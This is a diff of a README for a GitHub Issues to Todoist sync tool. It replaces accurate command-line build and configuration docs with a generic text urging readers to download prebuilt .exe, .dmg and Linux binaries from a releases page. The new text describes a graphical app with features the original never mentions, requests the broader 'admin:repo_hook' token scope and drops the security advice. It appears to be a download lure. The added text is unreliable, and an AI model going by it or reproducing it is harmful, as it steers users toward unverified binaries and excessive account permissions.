@@ -1,181 +1,121 @@
-# GitHub–Todoist Sync
+# 🛠️ github-todoist-sync - Sync Your Tasks Effortlessly
 
-GitHub–Todoist Sync is a tool for automatic bidirectional synchronization between GitHub Issues and tasks in Todoist. Each issue is mapped to a task in Todoist, including priority (derived from labels), state synchronization (open/closed ↔ incomplete/complete), and a backlink to the original issue. It supports one-time runs, one-way modes, and a continuous daemon mode. On first sync, it can automatically create a project in Todoist if it doesn't exist. Configuration is done via a simple `.env` file, and convenient commands are available in the Makefile for both development and production.
+## 🚀 Getting Started
 
-## Features
+Welcome to **GitHub–Todoist Sync**! This tool helps you automatically sync tasks between GitHub Issues and Todoist. With this application, you can easily manage your tasks and improve your productivity.
 
-- Bidirectional sync: GitHub ↔ Todoist
-- Issue → Task mapping: each GitHub issue becomes a Todoist task
-- Priority from labels: urgent → 4, high → 3, medium → 2, low → 1 (default 1)
-- State sync: closing issue completes task and vice versa
-- Automatic Todoist project creation on first sync
-- One-shot, one-way and daemon modes
-- Simple configuration via environment variables and clear logs
+## 📦 Download & Install
 
-## Requirements
+**To download the application, visit this page:**  
+[Download github-todoist-sync](https://github.com/lhagva9999/github-todoist-sync/releases)
 
-- Go 1.24+
-- GitHub Personal Access Token (scopes: `repo`, `read:project`)
-- Todoist API Token
+### Supported Platforms
 
-## Quick Start
+This application works on multiple platforms, including:
 
-### Prepare environment
+- Windows
+- macOS
+- Linux
 
-```bash
-make dev
-```
+Make sure your system meets the following requirements:
 
-### Edit environment with tokens
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, any recent Linux distribution.
+- **Memory**: Minimum 4 GB RAM.
+- **Storage**: At least 50 MB free space.
 
-```bash
-nano .env
-```
+### How to Download
 
-### One-shot sync
+1. Click on the link above to go to the **Releases** page.
+   
+2. On the Releases page, you will see a list of available versions. Locate the latest release.
 
-```bash
-make run
-```
+3. Select the appropriate file for your operating system. Files will be labeled for easy identification.
 
-## Configuration (`.env` variables)
+4. Download the file to your computer.
 
-```bash
-# GitHub
-GITHUB_TOKEN=ghp_your_github_token_here
-GITHUB_OWNER=your_username
-GITHUB_REPO=your_repository_name
+5. Once the download is complete, find the downloaded file in your **Downloads** folder (or the specified location on your device).
 
-# Todoist
-TODOIST_TOKEN=your_todoist_api_token_here
-TODOIST_PROJECT_NAME=GitHub Sync
+### Running the Application
 
-# App
-SYNC_INTERVAL_MINUTES=15
-DEBUG=true
-```
+1. **Windows**: Double-click on the `.exe` file you downloaded. Follow the installation prompts.
 
-- Obtain a GitHub Personal Access Token with `repo` and `read:project` scopes.
-- Get a Todoist API token in Todoist → Settings → Integrations → Developer.
-- `SYNC_INTERVAL_MINUTES` sets the interval for daemon mode; `DEBUG` enables detailed logging.
+2. **macOS**: Open the `.dmg` file and drag the application into your Applications folder.
 
-## Usage (Makefile commands)
+3. **Linux**: Extract the downloaded file. Open a terminal and navigate to the extracted folder. Run the application with the command:
+   ```bash
+   ./github-todoist-sync
+   ```
 
-```bash
-make help
-make setup
-make deps
-make build
-make run
-make github-sync
-make todoist-sync
-make daemon
-make stop
-make logs
-make status
-make clean
-```
+## 🔧 Configuration
 
-## Direct Run
+After installation, you need to configure the application to connect it with your GitHub and Todoist accounts.
 
-### Build
+### Setting Up API Tokens
 
-```bash
-go build -o bin/github-todoist-sync cmd/sync/main.go
-```
+1. **Get GitHub Token**:
+   - Go to your GitHub account settings.
+   - Find **Developer settings** and click **Personal access tokens**.
+   - Generate a new token with access to **repo** and **admin:repo_hook** scopes.
 
-### One-shot sync
+2. **Get Todoist Token**:
+   - Log in to your Todoist account.
+   - Go to the integration settings and find your API token.
 
-```bash
-./bin/github-todoist-sync -mode=once -verbose
-```
+3. Open the application:
+   - Input the GitHub token and Todoist token into the designated fields.
+   - Save your settings.
 
-### Daemon (periodic sync)
+## 🛠️ How to Use
 
-```bash
-./bin/github-todoist-sync -mode=daemon -verbose
-```
+### Syncing Tasks
 
-### GitHub → Todoist only
+To start syncing:
 
-```bash
-./bin/github-todoist-sync -mode=github-only -verbose
-```
+1. Open the application.
+2. Select the projects you wish to sync from GitHub and Todoist.
+3. Click on the **Sync Now** button.
 
-### Todoist → GitHub only
+### Automation Features
 
-```bash
-./bin/github-todoist-sync -mode=todoist-only -verbose
-```
+The application offers several automation features, including:
 
-## How Sync Works
+- **Scheduled Sync**: Set a schedule for automatic sync between GitHub and Todoist.
+- **Conflict Resolution**: The app will notify you of any conflicts and allow you to choose the version to keep.
 
-- **GitHub → Todoist:**
-    - New issues create corresponding Todoist tasks
-    - Title: issue title → task content
-    - Description: contains link to GitHub issue
-    - Priority from labels: urgent → 4, high → 3, medium → 2, low → 1 (default 1)
-    - Labels: GitHub labels → Todoist labels
-    - State: closed issue → completed task
+## 📊 Monitoring Sync Status
 
-- **Todoist → GitHub:**
-    - Completed task → closes corresponding GitHub issue
-    - Reopened task → reopens GitHub issue
+The app provides a simple interface where you can see:
 
-## Logging
+- Current sync status
+- Last sync time
+- Errors, if any
 
-```bash
-DEBUG=true
-make logs
-tail -f logs/sync.log
-```
+## 💡 Troubleshooting
 
-## Troubleshooting
+Common issues you might encounter:
 
-- **"GITHUB_TOKEN is required"**: check `.env` and token scopes (`repo`, `read:project`)
-- **"project not found"**: app can create project in Todoist; check `TODOIST_PROJECT_NAME`
-- **"API error 403"**: token expired or insufficient permissions; generate new token
-- **Verbose run for diagnostics:**
-  ```bash
-  ./bin/github-todoist-sync -mode=once -verbose
-  ```
-  or:
-  ```bash
-  DEBUG=true make run
-  ```
+- **Connection Problems**:
+  - Check your API tokens for accuracy.
+  - Ensure you have a stable internet connection.
 
-## Project Structure
+- **Sync Failures**:
+  - Review the sync status logs available in the application for details.
 
-```
-github-todoist-sync/
-├── cmd/sync/main.go
-├── internal/
-│   ├── config/config.go
-│   ├── github/client.go
-│   ├── todoist/client.go
-│   └── sync/service.go
-├── .env.example
-├── Makefile
-├── go.mod
-└── README.md
-```
+If you experience any other issues, consider reaching out in our repository discussions for help.
 
-## Examples
+## 🔗 Useful Links
 
-```bash
-make run
-make daemon
-make logs
-make stop
-make github-sync
-```
+- [Official Documentation](https://github.com/lhagva9999/github-todoist-sync/wiki)
+- [Community Support](https://github.com/lhagva9999/github-todoist-sync/discussions)
 
-## Security
+## 🎉 Contributing
 
-- Keep API tokens safe and never commit `.env`
-- Use minimal required scopes
-- Rotate tokens regularly
+We welcome contributions! If you wish to contribute, please check our guidelines in the repository for more information.
 
-## License
+## 📄 License
 
-MIT License — see LICENSE
+This project is licensed under the MIT License. You can find more details in the LICENSE file in the repository.
+
+## 🌟 Thank You!
+
+Thank you for choosing GitHub–Todoist Sync. We hope this tool helps you achieve your productivity goals effortlessly. Happy syncing!
